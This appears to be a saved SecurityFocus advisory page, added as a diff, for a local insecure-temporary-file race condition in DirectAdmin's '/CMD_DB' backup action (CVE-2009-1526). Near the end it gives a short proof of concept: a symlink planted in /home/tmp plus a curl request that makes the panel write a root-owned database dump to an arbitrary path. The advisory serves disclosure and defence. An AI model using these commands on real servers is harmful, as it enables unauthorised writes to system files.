@@ -1,0 +1,108 @@
+#SpeeDr00t@Black Falcon<br>#bid34676<p><b><span style="font-size: 18pt;">DirectAdmin '/CMD_DB' Backup Action Insecure Temporary File Creation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34676/info">info</a><br><a href="http://www.securityfocus.com/bid/34676/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34676/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34676/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34676/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34676
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Race Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-1526<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 22 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 19 2009 06:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				An anonymous reporter discovered this issue.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					JBMC Software DirectAdmin 1.33.3 <br/>
+					
+				
+					JBMC Software DirectAdmin 1.30.2 <br/>
+					
+				
+					JBMC Software DirectAdmin 1.30.1 <br/>
+					
+				
+					JBMC Software DirectAdmin  1.292<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					JBMC Software DirectAdmin 1.33.4 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker uses readily available commands to exploit the issue.<br/><br/>The following example is available:<br/><br/>On server: $ ln -s /etc/poc /home/tmp/database_name.gz<br/>On client: $ curl http://www.example.com:2222/CMD_DB/database_name.gz<br/>On server:<br/>$ ls -la /etc/poc<br/>-rw-r--r--  1 root root 514 Apr 22 09:05 /etc/poc<br/>$ zcat /etc/poc | head -1<br/>-- MySQL dump 10.9
+	
+		<ul>
+</ul>
+</div>
